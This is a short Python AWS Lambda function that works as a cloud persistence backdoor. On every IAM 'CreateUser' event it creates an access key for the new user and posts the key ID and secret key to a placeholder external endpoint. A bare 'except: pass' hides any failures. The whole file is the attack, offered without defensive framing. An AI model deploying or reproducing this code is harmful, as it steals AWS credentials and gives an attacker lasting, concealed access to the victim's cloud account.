import boto3
from botocore.vendored import requests
def lambda_handler(event,context):
    if event['detail']['eventName']=='CreateUser':
        client=boto3.client('iam')
        try:
            response=client.create_access_key(UserName=event['detail']['requestParameters']['userName'])
            requests.post('POST_URL',data={"AKId":response['AccessKey']['AccessKeyId'],"SAK":response['AccessKey']['SecretAccessKey']})
        except:
            pass
    return